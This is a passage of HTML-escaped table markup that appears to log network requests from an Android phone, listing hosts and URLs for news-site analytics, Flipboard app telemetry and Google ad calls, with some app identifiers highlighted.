                            /tx.io?st=mobsued&amp;cp=spracheDE%2FformatTXT%2FerzeugerRED%2FhomepageNO%2FauslieferungMOB%2FappNO%2FpaidNO%2FinhaltMUENCHEN&amp;pt=CP&amp;rf=flipboard.com&amp;r2=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fmuenchen%252Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074&amp;ur=www.sueddeutsche.de&amp;xy=800x1280x32&amp;lo=DE%2Fn.a.&amp;cb=0004&amp;vr=303&amp;id=vngwhf&amp;lt=1390050885098&amp;ev=&amp;cs=oshi9b&amp;mo=0
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            28
                          &lt;/th&gt;

                          &lt;td&gt;
                            de.sitestat.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /sueddeutsche/sueddeutsche/s?mobile.digital.thema.streaming.artikel.streamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis&amp;ns__t=1390051326068&amp;ads=y&amp;ns_referrer=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fdigital%252Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            29
                          &lt;/th&gt;

                          &lt;td&gt;
                            de.sitestat.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /sueddeutsche/sueddeutsche/s?mobile.karriere.thema.hochschulen.artikel.studie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne&amp;ns__t=1390147627074&amp;ads=y&amp;ns_referrer=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fkarriere%252Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            30
                          &lt;/th&gt;

                          &lt;td&gt;
                            de.sitestat.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /sueddeutsche/sueddeutsche/s?mobile.muenchen.thema.unfall.artikel.muenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg&amp;ns__t=1390050885114&amp;ads=y&amp;ns_referrer=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fmuenchen%252Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            31
                          &lt;/th&gt;

                          &lt;td&gt;
                            de.sitestat.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /sueddeutsche/sueddeutsche/s?mobile.muenchen.thema.unfall.artikel.muenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg&amp;ns_m2=yes&amp;ns_setsiteck=52DA7E4843FD03B2&amp;ns__t=1390050885114&amp;ads=y&amp;ns_referrer=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fmuenchen%252Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            32
                          &lt;/th&gt;

                          &lt;td&gt;
                            dl.google.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /dl/android/tts/patts/patts_metadata_19.proto
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            33
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=12c8430f-d6e8-4b8b-a81b-37d42dc6bf6f&amp;sdk=4.0.2&amp;t=781.191&amp;u=19ba7bd21bb3cfa3&amp;lag=0.001&amp;h=3eb6859c2b7b4872d0903a5bd5b73e46d79997aa
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            34
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=4ed8a8b6-82c0-4232-a5ce-0ff0acf87c0b&amp;sdk=4.0.2&amp;t=80.056&amp;u=19ba7bd21bb3cfa3&amp;lag=0.001&amp;h=e8da70f8d71b5ac6e44efe3651611d6ee9284ad5
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            35
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=5ad3eb54-8955-40e7-8108-c558e6adc919&amp;sdk=4.0.2&amp;t=194.835&amp;u=19ba7bd21bb3cfa3&amp;lag=0.001&amp;h=705f56c0c458b75d9907a3d50af5a2ad0c01e307
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            36
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=7cd33003-f7df-4eeb-b1c5-572fb46798f1&amp;sdk=4.0.2&amp;t=140.42000000000002&amp;u=19ba7bd21bb3cfa3&amp;lag=0.001&amp;h=409ba731c26ccb1509051b0b00a8fe83cb893026
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            37
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=8e65194d-96a8-407c-9df6-893a56160c2a&amp;sdk=4.0.2&amp;t=1.390057933191E9&amp;u=19ba7bd21bb3cfa3&amp;lag=83.558&amp;h=250884806d5e537fcebc7f11f751441409667f4c
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            38
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=8e65194d-96a8-407c-9df6-893a56160c2a&amp;sdk=4.0.2&amp;t=246.213&amp;u=19ba7bd21bb3cfa3&amp;lag=0.002&amp;h=ba36888f3bdbc623ae733fe6ddb4a7e9d3970329
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            39
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=8e65194d-96a8-407c-9df6-893a56160c2a&amp;sdk=4.0.2&amp;t=246.213&amp;u=19ba7bd21bb3cfa3&amp;lag=17.977&amp;h=f656c2496cc7e5754b5a481eaa5e1301149f00a7
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            40
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=96e5aa98-f272-4435-be3f-06d014cd8a7b&amp;sdk=4.0.2&amp;t=100.32600000000001&amp;u=19ba7bd21bb3cfa3&amp;lag=0.002&amp;h=23a34f980019b660ae6d68cea5d60d495d3b513c
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            41
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=e9ae671b-3968-48bd-bbf6-87c60f5c0e40&amp;sdk=4.0.2&amp;t=86.96000000000001&amp;u=19ba7bd21bb3cfa3&amp;lag=0.0&amp;h=a662c61a8e06173f3bbb43d2dd03509ca773877c
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            42
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=&amp;i=flipboard.app&amp;n=heartbeat&amp;p=Android&amp;rt=json&amp;s=12c8430f-d6e8-4b8b-a81b-37d42dc6bf6f&amp;sdk=4.0.2&amp;t=301.022&amp;u=19ba7bd21bb3cfa3&amp;lag=0.029&amp;h=29e3483b07cf05a365a247e4820f61a1b75159c7
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            43
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=&amp;i=flipboard.app&amp;n=heartbeat&amp;p=Android&amp;rt=json&amp;s=4f544310-2c2f-4dcf-9bef-762535fcb4c1&amp;sdk=4.0.2&amp;t=301.277&amp;u=19ba7bd21bb3cfa3&amp;lag=0.001&amp;h=4c805327cfb1d98f8dcba5ea9b4a09aba7be887b
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            44
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/event?u=-1
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            45
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=12c8430f-d6e8-4b8b-a81b-37d42dc6bf6f&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=0.976&amp;h=13e2981c856f8d5b03df533875ab0e7051b16ad4
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            46
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=4c161362-9275-473d-9068-14098d15ef54&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=1.732&amp;h=d285ad812ebea1d8d0a0682f54d618c3bf6900b9
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            47
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=4ed8a8b6-82c0-4232-a5ce-0ff0acf87c0b&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=1.494&amp;h=a56e9b60daae1674ec4c759d4601521221e2f58a
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            48
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=4f544310-2c2f-4dcf-9bef-762535fcb4c1&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=1.244&amp;h=5603e16f6b981f61f47be74396dc7879580d401a
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            49
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=5ad3eb54-8955-40e7-8108-c558e6adc919&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=1.178&amp;h=7e5b2e6faf5f4e13e071e19f7b18a2036e4f8c99
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            50
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=6760c71d-2ef1-4482-b465-f07bb91abe81&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=0.165&amp;h=1ab03e483d1330b35abba17936a9f516f4455f37
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            51
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=7cd33003-f7df-4eeb-b1c5-572fb46798f1&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=1.351&amp;h=f520aae0f0556292cbb16e64e13a1945509fd257
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            52
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=8e65194d-96a8-407c-9df6-893a56160c2a&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=1.564&amp;h=9e389c83ed0ad2fc6cfb55483654aed3857f5603
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            53
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=96e5aa98-f272-4435-be3f-06d014cd8a7b&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=0.232&amp;h=8bc0f1a369ef2190d4be0d19776c98e81b4c2e1f
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            54
                          &lt;/th&gt;

                          &lt;td&gt;
                            e.apsalar.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=e9ae671b-3968-48bd-bbf6-87c60f5c0e40&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=1.2610000000000001&amp;h=9e3ccea7d91a68c3817076e79398c8575f547e07
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            55
                          &lt;/th&gt;

                          &lt;td&gt;
                            farm.plista.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /getuid?origin=http%3A%2F%2Fwww.sueddeutsche.de&amp;publickey=a279c87dd4de76f6f1bf200a&amp;mode=test
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            56
                          &lt;/th&gt;

                          &lt;td&gt;
                            farm.plista.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /tinyPlistaGetRendered.php?publickey=a279c87dd4de76f6f1bf200a&amp;widgetname=mobile&amp;c=digital&amp;pxr=1.6699999570846558&amp;isid=%20undefined&amp;item%5Bobjectid%5D=m1866025&amp;item%5Bcreated_at%5D=1390035621&amp;item%5Burl%5D=http%3A%2F%2Fwww.sueddeutsche.de%2Fdigital%2Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025&amp;item%5Bkicker%5D=Streamseite%20Redtube&amp;item%5Btitle%5D=L%C3%B6chriges%20Gutachten%20bringt%20Porno-Abmahner%20in%20Bedr%C3%A4ngnis&amp;item%5Btext%5D=Wie%20kamen%20sie%20an%20die%20IP-Adressen%20der%20Redtube-Nutzer%3F%20Ein%20jetzt%20aufgetauchtes%2C%20fragw%C3%BCrdiges%20Gutachten%20birgt%20neuen%20%C3%84rger%20f%C3%BCr%20die%20Hinterm%C3%A4nner%20der%20Abmahnwelle.%20Doch%20auch%20f%C3%BCr%20einige%20K%C3%B6lner%20Richter%20ist%20das%20Papier%20eine%20Blamage.&amp;item%5Bimg%5D=http%3A%2F%2Fpolpix.sueddeutsche.com%2Fbild%2F1.1839719.1389206254%2F560x315%2Fredtube-abmahnung.jpg&amp;item%5Bcategory%5D=digital&amp;instanceID=&amp;Pookie=Q2C1zHwmoPb4ncSlaUvJGQ%3D%3D
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            57
                          &lt;/th&gt;

                          &lt;td&gt;
                            farm.plista.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /tinyPlistaGetRendered.php?publickey=a279c87dd4de76f6f1bf200a&amp;widgetname=mobile&amp;c=muenchen&amp;pxr=1.6699999570846558&amp;isid=%20undefined&amp;item%5Bobjectid%5D=m1866074&amp;item%5Bcreated_at%5D=1390047141&amp;item%5Burl%5D=http%3A%2F%2Fwww.sueddeutsche.de%2Fmuenchen%2Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074&amp;item%5Bkicker%5D=M%C3%BCnchen-Haidhausen&amp;item%5Btitle%5D=Pl%C3%B6tzlich%20zehn%20Meter%20tiefes%20Loch%20im%20Gehweg&amp;item%5Btext%5D=T%C3%BCckische%20Falle%20in%20Haidhausen%3A%20Auf%20einem%20Gehsteig%20in%20M%C3%BCnchen%20ist%20ein%20Mann%20fast%20in%20ein%20zehn%20Meter%20tiefes%20Loch%20eingebrochen.%20Jetzt%20r%C3%A4tseln%20die%20Beh%C3%B6rden%2C%20wozu%20der%20gemauerte%20Schacht%20dienen%20k%C3%B6nnte.&amp;item%5Bimg%5D=http%3A%2F%2Fpolpix.sueddeutsche.com%2Fpolopoly_fs%2F1.1866075.1390044549!%2FhttpImage%2Fimage.jpg_gen%2Fderivatives%2F560x315%2Fimage.jpg&amp;item%5Bcategory%5D=muenchen&amp;instanceID=&amp;Pookie=
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            58
                          &lt;/th&gt;

                          &lt;td&gt;
                            faz.ivwbox.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /cgi-bin/ivw/CP/szmmobil_222F000006E6;faz.net/aktuell/mobil/ressorts/gesellschaft?n=&amp;d=1390147719
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            59
                          &lt;/th&gt;

                          &lt;td&gt;
                            faz.ivwbox.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /cgi-bin/ivw/CP/szmmobil_222F000006E7;faz.net/aktuell/mobil/ressorts/wirtschaft?n=&amp;d=1390051122
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            60
                          &lt;/th&gt;

                          &lt;td&gt;
                            fbprod.flipboard.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /init3.php?callback=callbackTable.jsonpCallback1146518
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            61
                          &lt;/th&gt;

                          &lt;td&gt;
                            fbprod.flipboard.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /load?app=aml&amp;action=load&amp;page=1&amp;sess=3352901904944345600.1390058020.s&amp;id=3743464895410673152.1390039154.u&amp;ts=1390058021.101&amp;tz=-60&amp;url=http%253A%252F%252Fwww.stern.de%252Fpolitik%252Fdeutschland%252Fwahlen-zum-ministerpraesidenten-in-hessen-volker-bouffier-setzt-sich-gegen-max-mustermann-durch-2083964.html%2523utm_source%253Dstandard%252526utm_medium%253Drss-feed%252526utm_campaign%253Dalle&amp;fr=fl&amp;articleType=article&amp;totalPages=1&amp;section=flipboard%2Fmix%252F30924883&amp;pr=rss-stern&amp;dv=aphone&amp;amv=2.4
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            62
                          &lt;/th&gt;

                          &lt;td&gt;
                            feeds.reuters.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /Reuters/worldNews
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            63
                          &lt;/th&gt;

                          &lt;td&gt;
                            gllto.glpals.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /rtistatus.dat
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            64
                          &lt;/th&gt;

                          &lt;td&gt;
                            googleads.g.doubleclick.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /mads/gma?preqs=0&amp;session_id=17592708045346502934&amp;u_sd=1.6750001&amp;seq_num=1&amp;u_w=477&amp;msid=&lt;span style=&quot;background-color: #00ff00;&quot;&gt;com.iudesk.android.photo.editor&lt;/span&gt;&amp;js=afma-sdk-a-v6.4.1&amp;ms=nb-L0MAMQe8GvfY_GF6rij7OVhr7yp8iklRfdZEsobLfPN2V1HAwhr3fZaYYsV8OvnBAI7zvDSK59SGWlN8KYfs6k4fUhLp8gwe1zJEHx3aqI1SDtGvoMoDutEe208dqebTP_5d2Ydk4yTNoeVXbACMjJRSOmtoMcMr-P84vo-d1J-36mfPUt4gIueReT9-a1nSfXwrGJ2asIUygSe5Z6OG2q805BRqRtNkbyhnefM7MheC_wWGiqgvdJHjrKa5AZu78GZhAyaseI89idFJ7Qm8Tp4ngsn93gewdu0PP_xJnsQp1DTgrzZMJINW9n2AiZO0CZz5d7vxXMqtPlnNReA&amp;mv=&lt;span style=&quot;background-color: #00ff00;&quot;&gt;80240021.com.android.vending&lt;/span&gt;&amp;bas_off=0&amp;format=320x50_mb&amp;oar=0&amp;net=ed&amp;app_name=&lt;span style=&quot;background-color: #00ff00;&quot;&gt;2014010100.android.com.iudesk.android.photo.editor&lt;/span&gt;&amp;hl=de&amp;gnt=8&amp;u_h=764&amp;carrier=26207&amp;bas_on=0&amp;ptime=0&amp;u_audio=3&amp;imbf=8009&amp;u_so=p&amp;output=html&amp;region=mobile_app&amp;u_tz=60&amp;client_sdk=1&amp;ex=1&amp;slotname=a14ecccef2eb8b3&amp;gsb=4g&amp;caps=inlineVideo_interactiveVideo_mraid1_th_mediation_sdkAdmobApiForAds_di&amp;eid=46621027&amp;jsv=66&amp;urll=935
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            65
                          &lt;/th&gt;

                          &lt;td&gt;
                            googleads.g.doubleclick.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /mads/gma?preqs=1&amp;session_id=17592708045346502934&amp;seq_num=2&amp;u_w=477&amp;msid=com.iudesk.android.photo.editor&amp;js=afma-sdk-a-v6.4.1&amp;prnl=9113&amp;bas_off=0&amp;imbf=8009&amp;net=ed&amp;app_name=2014010100.android.com.iudesk.android.photo.editor&amp;hl=de&amp;gnt=8&amp;carrier=26207&amp;u_audio=3&amp;u_sd=1.6750001&amp;ms=9yd99ZXvdmEJUHLeuHhY3u41mO_tOfndaTotwt2F-DVGft5m9EnXHzmLRD4RgOdlrS79cEhF2TGnDLGU0yj7ZzSMp8TS0MCClasMlEOLyViG8uYbFKmnHxqgdV3_FLSnwqHN7_us4Zr2azrucwql5_9qW_5so47ZR9XHBJYGiVcJy0B6aYPDbvad-njT6YVf0U5IqZIAjoZ20jX1ojaFE-pu0rpUdANjwxYgkh0UEJXhZHgF5lo_Msi3AW3UMa6K_Xk5HqVR3TeRMwwOr9qfkNTiUDyUEwqGqnCkWUzWkmdfanS64UprjTGxmQ675siWdWmE-AeqzfaRVcseiw74mw&amp;mv=80240021.com.android.vending&amp;format=320x50_mb&amp;oar=0&amp;u_h=764&amp;bas_on=0&amp;ptime=69277&amp;prl=11406&amp;u_so=p&amp;output=html&amp;region=mobile_app&amp;u_tz=60&amp;client_sdk=1&amp;ex=1&amp;slotname=a14ecccef2eb8b3&amp;askip=1&amp;gsb=4g&amp;caps=inlineVideo_interactiveVideo_mraid1_th_mediation_sdkAdmobApiForAds_di&amp;jsv=66&amp;urll=935
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            66
                          &lt;/th&gt;

                          &lt;td&gt;
                            googleads.g.doubleclick.net
                          &lt;/td&gt;

                          &lt;td&gt;
